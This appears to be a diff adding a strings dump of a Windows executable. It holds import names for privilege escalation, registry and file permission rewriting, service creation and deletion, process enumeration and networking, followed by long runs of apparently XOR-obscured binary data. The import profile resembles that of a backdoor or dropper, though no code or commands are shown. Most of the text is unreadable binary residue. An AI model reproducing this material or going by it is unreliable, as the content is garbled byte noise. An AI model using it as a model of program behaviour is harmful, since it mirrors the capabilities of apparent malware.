@@ -1,0 +1,247 @@
+!This program cannot be run in DOS mode.
+Rich);7
+]4>L
+CODE
+`.data
+.rsrc
+@.idata2
+ADVAPI32.dll
+U Rj
+jzjb
+SVWj
+h@N@
+(SVW
+hPN@
+h0N@
+hnK@
+hSVW
+hH`@
+hD`@
+h@`@
+>"u:F
+XPVSS
+hnK@
+KErN
+el32
+t2h	,
+*?ru
+u6j\
+0;-dt
+j h$
+tEhX
+SVWj
+_^[]
+QRh<
+hhO@
+QRh@
+QRhD
+QRhH
+QRhL
+QRhP
+QRhT
+QRhX
+QRh\
+QRh`
+QRhd
+QRhh
+QRhl
+QRhp
+QRht
+QRhx
+QRh|
+;x4u
+AdjustTokenPrivileges
+LookupPrivilegeValueA
+OpenProcessToken
+FreeSid
+RegCloseKey
+RegSetKeySecurity
+SetSecurityDescriptorDacl
+InitializeSecurityDescriptor
+AddAccessAllowedAce
+InitializeAcl
+GetLengthSid
+AllocateAndInitializeSid
+RegOpenKeyExA
+RegEnumValueA
+RegEnumKeyExA
+RegQueryValueExA
+RegDeleteValueA
+RegDeleteKeyA
+RegSetValueExA
+RegCreateKeyExA
+SetFileSecurityA
+GetSecurityDescriptorControl
+AddAce
+EqualSid
+GetAce
+GetAclInformation
+GetSecurityDescriptorDacl
+LookupAccountNameA
+GetFileSecurityA
+ChangeServiceConfigA
+StartServiceA
+OpenSCManagerA
+ChangeServiceConfig2A
+RegRestoreKeyA
+RegSaveKeyA
+CloseServiceHandle
+DeleteService
+CreateServiceA
+ControlService
+QueryServiceConfigA
+QueryServiceStatus
+OpenServiceA
+wsprintfA
+FlashWindow
+GetActiveWindow
+USER32.dll
+memmove
+__CxxFrameHandler
+rand
+_ftol
+tolower
+malloc
+strncmp
+_except_handler3
+memset
+srand
+MSVCRT.dll
+??1type_info@@UAE@XZ
+_exit
+_XcptFilter
+exit
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_controlfp
+GetCurrentProcess
+CloseHandle
+Process32Next
+lstrcmpiA
+Process32First
+CreateToolhelp32Snapshot
+GetLastError
+CreateDirectoryA
+DeleteFileA
+SetFileAttributesA
+GetFileAttributesA
+GetSystemDirectoryA
+GetModuleHandleA
+GetProcAddress
+Sleep
+ExitProcess
+LoadLibraryA
+GetCurrentDirectoryA
+GetTempPathA
+WriteFile
+SetFilePointer
+CreateFileA
+WaitForSingleObject
+CreateEventA
+ExpandEnvironmentStringsA
+SetEnvironmentVariableA
+SleepEx
+IsBadReadPtr
+ExitThread
+GetTickCount
+GetExitCodeThread
+CreateThread
+SetUnhandledExceptionFilter
+CreateProcessA
+GetStartupInfoA
+CopyFileA
+GetCommandLineA
+GetCurrentThreadId
+GetModuleFileNameA
+IsBadWritePtr
+KERNEL32.dll
+PathFileExistsA
+SHDeleteKeyA
+SHCopyKeyA
+SHGetValueA
+SHLWAPI.dll
+WS2_32.dll
+_itoa
+FreeLibrary
+LocalAlloc
+InterlockedExchange
+RaiseException
+gggge
+142mlg~U--e`dm{ffgg{:'2UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUErUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU418<;bbmmllUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
+UUUUUUUUUUUUUUTUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUebggUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU-6#&U&UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
+<;1:"&u
+-<!6"4,u
+<'0"499z
+;!0';0!u
+:;;06!<:;u
+=4'<;2u}
+|{UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
+UUUUUUUUUUUUUUUUUUUUUp
+%%9<64!<:;u
+4!4	
+!:'8	 %14!0	UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
+qqqq
+NM6pqqqM
+N| y_
+@f'S
+f[|qq
+qqqq
+qqqq
+qqqq
+qqqq
+qqqq
+Ffe]
+qpqq
+6%$$$y
+rsqq
+Efrt
+rqqqq
+Uqq1*
+| y_
+Gq| 
+f!Wqq.
+fb[qq
+[pqq
+g3pqq
+rqqqq
+Cf+?
+| y_
+Gq| 
+| y_
+rqqqq
+}%g_
+N| y_
+| y_
+N| y_
+| y_
+N| y_
+| y_
+N| y_
+| y_
+N| y_
+| y_
+N| y_
+| y_
+N| y_
+| y_
+Af_m
+p| y_
+l;}%
+f^Kqq
+}pqq
+fwVqq
+qXgNtqqq
+6sqqq
+fz_qq
+6pqqq
+6pqqq
+6rqqq
+fa>qq
+6pqqq
+6tqqq
